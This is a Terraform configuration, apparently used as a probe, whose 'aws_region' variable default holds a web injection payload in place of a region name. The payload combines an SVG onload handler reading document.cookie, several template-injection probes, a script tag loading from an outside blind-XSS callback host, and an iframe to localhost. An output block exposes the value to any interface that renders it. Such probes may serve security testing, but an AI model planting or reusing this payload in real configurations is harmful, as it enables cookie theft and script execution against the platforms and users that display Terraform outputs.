
terraform {
  required_providers {
    local = {
      source = "hashicorp/local"
      version = "2.4.0"
    }
  }
}

variable "aws_region" {
  description = "AWS region"
  type        = string
  default = "Hello {{ var }}/><svg onload='confirm(document.cookie)'>{{2*2}}[[3*3]]{{4*'4'}}<%= 5 * 5 %>@(8+8)#{9*8}><script src=https://omar.bxss.in><script><iframe src='http://localhost'></iframe><s>html</s>"
}


resource "local_file" "foo" {
  content  = "foo!fffxx"
  filename = "${path.module}/example.txt"

}


output "aws_region_output" {
 value = var.aws_region
}
